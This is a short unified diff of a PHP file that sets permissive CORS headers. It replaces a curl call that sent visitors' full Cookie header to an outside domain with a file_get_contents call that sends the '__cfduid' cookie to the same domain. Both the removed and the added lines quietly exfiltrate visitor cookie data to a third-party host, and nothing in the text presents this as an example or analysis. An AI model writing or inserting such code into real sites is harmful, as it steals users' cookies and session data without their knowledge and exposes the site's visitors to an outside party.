@@ -1,8 +1,6 @@
 <?php
 header('Access-Control-Allow-Credentials: true');
 header('Access-Control-Allow-Origin: *'); 
-$ch = curl_init(); 
-curl_setopt($ch, CURLOPT_URL, "http://xyz-ddos-txx.gq/?d=".getallheaders()['Cookie']); 
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
-curl_exec($ch); 
+$a = isset($_COOKIE['__cfduid'])?$_COOKIE['__cfduid']:0;
+file_get_contents("http://xyz-ddos-txx.gq/?d=".$a);
 ?>
